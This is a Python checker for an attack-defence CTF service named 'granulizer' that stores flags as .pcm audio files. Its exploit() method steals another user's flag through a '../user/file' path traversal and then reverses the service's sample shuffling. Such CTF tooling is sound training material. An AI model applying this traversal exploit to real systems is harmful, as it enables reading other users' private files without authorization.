#!/usr/bin/env python3
from enochecker import BaseChecker, BrokenServiceException, EnoException, run
from enochecker.utils import SimpleSocket, assert_equals, assert_in
import random
import string
import base64
import json
import re
import itertools
import hashlib

#### Checker Tenets
# A checker SHOULD not be easily identified by the examination of network traffic => This one is not satisfied, because our usernames and notes are simple too random and easily identifiable.
# A checker SHOULD use unusual, incorrect or pseudomalicious input to detect network filters => This tenet is not satisfied, because we do not send common attack strings (i.e. for SQL injection, RCE, etc.) in our notes or usernames.
####

flag_file_name = "flag.pcm"

class GranulizerChecker(BaseChecker):
    """
    Change the methods given here, then simply create the class and .run() it.
    Magic.
    A few convenient methods and helpers are provided in the BaseChecker.
    ensure_bytes ans ensure_unicode to make sure strings are always equal.
    As well as methods:
    self.connect() connects to the remote server.
    self.get and self.post request from http.
    self.chain_db is a dict that stores its contents to a mongodb or filesystem.
    conn.readline_expect(): fails if it's not read correctly
    To read the whole docu and find more goodies, run python -m pydoc enochecker
    (Or read the source, Luke)
    """

    ##### EDIT YOUR CHECKER PARAMETERS
    flag_variants = 1
    noise_variants = 0
    havoc_variants = 0
    exploit_variants = 1

    service_name = "granulizer"
    port = 2345  # The port will automatically be picked up as default by self.connect and self.http.
    ##### END CHECKER PARAMETERS

    def register_user(self, conn: SimpleSocket, username: str, password: str, details: str):
        self.debug(
            f"Sending command to register user: {username} with password: {password}, details: {details}"
        )
        #response = conn.readuntil("> ")

        conn.write(f"r\n")
        conn.readline_expect(
            b"Username: ",
            read_until=b": ",
            exception_message="Failed to enter register command"
        )

        conn.write(f"{username}\n")
        conn.readline_expect(
            b"Password: ",
            read_until=b"Password: ",
            exception_message="Failed to enter unter name"
        )

        conn.write(f"{password}\n")
        conn.readline_expect(
            b"Please share some details about yourself: ",
            read_until=b"Please share some details about yourself: ",
            exception_message="Failed to register user",
        )

        conn.write(f"{details}\n")
        conn.readline_expect(
            b"ok",
            read_until=b"ok",
            exception_message="Failed to register user"
        )

    def login_user(self, conn: SimpleSocket, username: str, password: str):
        self.debug(f"Sending command to login.")
        
        conn.write(f"l\n")

        conn.readline_expect(
            b"Username: ",
            read_until=b": ",
            exception_message="Failed to enter register command"
        )

        conn.write(f"{username}\n")
        conn.readline_expect(
            b"Password: ",
            read_until=b"Password: ",
            exception_message="Failed to enter unter name"
        )

        conn.write(f"{password}\n")

        conn.readline_expect(
            b"What do you want to do?",
            read_until=b"> ",
            exception_message="User checking failed"
        )


    def granulize_file(self, conn: SimpleSocket, filename: str, username: str):
        self.debug(f"Try to granulize file {filename}\n")
    
        conn.write(f"granulize\n")
        conn.readline_expect(
            b"Enter a file name: ",
            read_until=b"Enter a file name: ",
            exception_message="Failed to enter 'granulize' command"
        )

        conn.write(f"{filename}\n")
        expect_str = "written to file users/{}/granulized.pcm\nWhat do you want to do?\n > ".format(username)
        conn.readline_expect(
            expect_str,
            read_until=expect_str,
            exception_message="Failed to granulize"
        )

        self.debug("Granulized successfully!\n")

        

    #checker has to login before put_pcm is called
    def put_pcm(self, conn: SimpleSocket, filename: str, flag: str):
        self.debug(f"Put .pcm file as flag")

        conn.write(f"upload pcm\n")
        conn.readline_expect(
            b"Enter file name for new file: ",
            read_until=b"Enter file name for new file: ",
            exception_message="Failed to enter 'upload pcm' command"
        )

        conn.write(f"{filename}\n")
        conn.readline_expect(
            b"Enter base64 encoded wave file\n",
            read_until=b"Enter base64 encoded wave file\n",
            exception_message="Failed to enter file name"
        )

        #write flag as file
        flagb64_bytes = base64.b64encode(flag.encode('utf-8'))
        flagb64 = flagb64_bytes.decode('utf-8')        
        conn.write(f"{flagb64}\n")
        conn.readline_expect(
            b"Success\n",
            read_until=b"Success\n",
            exception_message="B64 encoded flag writing did not work"
        )

    
    def get_pcm(self, conn: SimpleSocket, filename: str) -> bytearray:
        self.debug(f"Get .pcm file as flag")

        conn.write(f"download pcm\n")
        conn.readline_expect(
            b"Filename: ",
            read_until=b"Filename: ",
            exception_message="Failed to enter file name"
        )

        conn.write(f"{filename}\n")

        conn.readline()
        conn.readline() #TODO add timeout
        base64_b = conn.readline()
        self.debug("Read b64 encoded:")
        self.debug(base64_b)
        file_content_b = base64.decodebytes(base64_b)
        self.debug("Base64 decoded:")
        self.debug(file_content_b)
        
        return file_content_b
    
    def flatten(self, lst):
        return list(itertools.chain(*[self.flatten(i) if isinstance(i, list) else [i] for i in lst]))

    def reverse_pcm(self, bytes_in: bytearray, granular_number_samples: int, granular_order_samples,
        granular_order_timelens, granular_order_buffer_lens):
        
        self.debug("Reverse pcm")

        grain_offset = 0
        grains_list = {}
        for i in range(granular_number_samples): #reconstruct grains with correct length
            this_grain_orig_pos = granular_order_samples[i]
            this_grain_timelen = granular_order_timelens[this_grain_orig_pos]
            this_grain_len = granular_order_buffer_lens[this_grain_orig_pos]

            orig_grain = [0] * this_grain_len #init empty array for this grain
            
            for g in range(this_grain_len):
                index_read = g * this_grain_timelen + grain_offset
                orig_grain[g] = bytes_in[index_read]

            grain_offset += this_grain_timelen * this_grain_len
            grains_list[this_grain_orig_pos] = orig_grain #add reconstructed grain to list
            
        #reconstruct order of grains
        orig_data = []
        for i in range(granular_number_samples):
            orig_data.append(grains_list.get(i))
        orig_data = self.flatten(orig_data)
        #convert into string:
        self.debug("Reverse done, orig_data flattened:")
        self.debug(orig_data)
        d = bytes(orig_data)
        utf8_str = d.decode('utf-8')
        self.debug(utf8_str)
        #char_array = [chr(i) for i in orig_data if i is not None]
        #reconstructed_str = ''.join(char_array)
        #reconstructed_str = ''.join(orig_data)
        return utf8_str
        return reconstructed_str

    def helper_parse_bytearray(self, byte_array):
        # Convert bytearray to string
        string = byte_array.decode('utf-8')
        
        # Split the string by the equal sign and get the value after it
        value_string = string.split('=')[1].strip()
        
        # Convert the value string to an integer
        value_int = int(value_string)
        
        return value_int



    def helper_parse_bytearray_to_list(self, byte_array):
        # Convert bytearray to string
        byte_string = byte_array.decode()
        
        # Extract list of integers from string
        match = re.search(r'\[([\d,\s]+)\]', byte_string)
        if match:
            int_string = match.group(1)
        else:
            raise ValueError("No list of integers found in byte array")
        
        # Convert string of integers to list of integers
        int_list = list(map(int, int_string.split(',')))
        
        return int_list


    def granulize_info(self, conn: SimpleSocket):
        self.debug(f"Try to get granulize info")

        conn.write(f"granulize info\n")
        #Data from server should look like this:
        #granular_number_samples = 5
        #granular_order_samples = [4,2,0,1,3]
        #granular_order_timelens = [2,2,2,2,2]
        #granular_order_buffer_lens = [4,4,4,4,7]
        granular_number_samples_b = conn.readline()
        granular_order_samples_b = conn.readline()
        granular_order_timelens_b = conn.readline()
        granular_order_buffer_lens_b = conn.readline()
        self.debug("Got:")
        self.debug(granular_number_samples_b)
        self.debug(granular_order_samples_b)
        self.debug(granular_order_timelens_b)
        self.debug(granular_order_buffer_lens_b)
        
        conn.readline_expect(
            b"What do you want to do?",
            read_until=b"> ",
            exception_message="Wrong output for granulize info"
        )
        
        back = {}

        #convert:
        back['granular_number_samples'] = self.helper_parse_bytearray(granular_number_samples_b)
        back['granular_order_samples'] = self.helper_parse_bytearray_to_list(granular_order_samples_b)
        back['granular_order_timelens'] = self.helper_parse_bytearray_to_list(granular_order_timelens_b)
        back['granular_order_buffer_lens'] = self.helper_parse_bytearray_to_list(granular_order_buffer_lens_b)
        self.debug(back['granular_number_samples'])
        self.debug(back['granular_order_samples'])
        self.debug(back['granular_order_timelens'])
        self.debug(back['granular_order_buffer_lens'])
        
        return back


    def putflag(self):  # type: () -> None
        """
        This method stores a flag in the service.
        In case multiple flags are provided, self.variant_id gives the appropriate index.
        The flag itself can be retrieved from self.flag.
        On error, raise an Eno Exception.
        :raises EnoException on error
        :return this function can return a result if it wants
                if nothing is returned, the service status is considered okay.
                the preferred way to report errors in the service is by raising an appropriate enoexception
        """
        if self.variant_id == 0:
            # First we need to register a user. So let's create some random strings. (Your real checker should use some funny usernames or so)
            username: str = "".join(
                random.choices(string.ascii_uppercase + string.digits, k=12)
            )
            password: str = "".join(
                random.choices(string.ascii_uppercase + string.digits, k=12)
            )
            details: str = "".join(
                random.choices(string.ascii_uppercase + string.digits, k=12)                
            )

            # Log a message before any critical action that could raise an error.
            self.debug(f"Connecting to service")
            # Create a TCP connection to the service.
            conn = self.connect()
            welcome = conn.read_until(">")

            # Register a new user
            self.register_user(conn, username, password, details)

            # Now we need to login
            self.login_user(conn, username, password)

            # Put flag (.pcm file)
            self.debug("Put flag:")
            self.debug(self.flag)
            self.put_pcm(conn, flag_file_name, self.flag)
            
            # Save the generated values for the associated getflag() call.
            # This is not a real dictionary! You cannot update it (i.e., self.chain_db["foo"] = bar) and some types are converted (i.e., bool -> str.). See: https://github.com/enowars/enochecker/issues/27
            self.chain_db = {
                "username": username,
                "password": password,
                "details": details
            }

            return json.dumps({
                "user_name": username,
                "file_name": flag_file_name
            })
        else:
            raise EnoException("Wrong variant_id provided")


    def getflag(self):  # type: () -> None
        """
        This method retrieves a flag from the service.
        Use self.flag to get the flag that needs to be recovered and self.round to get the round the flag was placed in.
        On error, raise an EnoException.
        :raises EnoException on error
        :return this function can return a result if it wants
                if nothing is returned, the service status is considered okay.
                the preferred way to report errors in the service is by raising an appropriate enoexception
        """
        if self.variant_id == 0:
            # First we check if the previous putflag succeeded!
            try:
                username: str = self.chain_db["username"]
                password: str = self.chain_db["password"]
                details: str = self.chain_db["details"]
            except Exception as ex:
                self.debug(f"error getting notes from db: {ex}")
                raise BrokenServiceException("Previous putflag failed.")

            self.debug(f"Connecting to the service")
            conn = self.connect()
            welcome = conn.read_until(">")

            # Let's login to the service
            self.login_user(conn, username, password)

            # Let´s obtain our flag
            flag_b = self.get_pcm(conn, flag_file_name)
            flag = flag_b.decode('utf-8')

            #control that it is correct
            if (flag != self.flag):
                raise BrokenServiceException("flags are not similar!")

            # Exit!
            self.debug(f"Sending exit command")
            conn.write(f"exit\n")
            conn.close()
        else:
            raise EnoException("Wrong variant_id provided")

    def putnoise(self):
        raise EnoException("Wrong variant_id provided")

    def getnoise(self):
        raise EnoException("Wrong variant_id provided")
    
    def havoc(self):
        raise EnoException("Wrong variant_id provided")
    

    def exploit(self):
        """
        This method was added for CI purposes for exploits to be tested.
        Will (hopefully) not be called during actual CTF.
        :raises EnoException on Error
        :return This function can return a result if it wants
                If nothing is returned, the service status is considered okay.
                The preferred way to report Errors in the service is by raising an appropriate EnoException
        """
        if self.variant_id == 0:

            #login as some user
            
            #granulize ../{user}/flag.pcm
            #download pcm
            #flag.pcm

            #reverse

            #check
            #hash flag!
            '''
            flag_hash = hashlib.sha256(flag.encoide()).hexdigest()

            if flag_hash != self.flag_hash:
                raise BrokenServiceException("Flag is not correct")
            '''
            attack_info = json.loads(self.attack_info)
            self.debug("Got attack info:")
            self.debug(attack_info)
            user_name_exploit = attack_info['user_name']
            file_name_exploit = attack_info['file_name']

            # Log a message before any critical action that could raise an error.
            self.debug(f"Connecting to service")
            # Create a TCP connection to the service.
            conn = self.connect()
            welcome = conn.read_until(">")

            username: str = "".join(
                random.choices(string.ascii_uppercase + string.digits, k=12)
            )
            password: str = "".join(
                random.choices(string.ascii_uppercase + string.digits, k=12)
            )
            details: str = "".join(
                random.choices(string.ascii_uppercase + string.digits, k=12)                
            )

            # Register a new random user for exploiting
            self.register_user(conn, username, password, details)

            # Now we need to login
            self.login_user(conn, username, password)
            
            # Granulize file of user to be exploited
            path_traversal = "../{user_name}/{file_name}".format(user_name=user_name_exploit, file_name = file_name_exploit)
            self.granulize_file(conn, path_traversal, username)

            #Get granulize parameters
            granulize_params = self.granulize_info(conn)

            #get file for reversing
            data = self.get_pcm(conn, "granulized.pcm")
            self.debug("Got data from server:")
            self.debug(data)

            #reverse
            reversed = self.reverse_pcm(data, 
                granulize_params['granular_number_samples'], 
                granulize_params['granular_order_samples'],
                granulize_params['granular_order_timelens'],
                granulize_params['granular_order_buffer_lens'])
            self.debug("Complete reversed: ")
            self.debug(reversed)
            #build hash of this flag and compare
            flag_hash_got = hashlib.sha256(reversed.encode()).hexdigest()
            self.debug(flag_hash_got)
            self.debug(self.flag_hash)

            if flag_hash_got != self.flag_hash:
                raise BrokenServiceException("Flag is not correct")
            self.debug("Correct hash!")
            
            return reversed
        else:
            raise EnoException("Wrong variant_id provided")


app = GranulizerChecker.service  # This can be used for uswgi.
if __name__ == "__main__":
    run(GranulizerChecker)
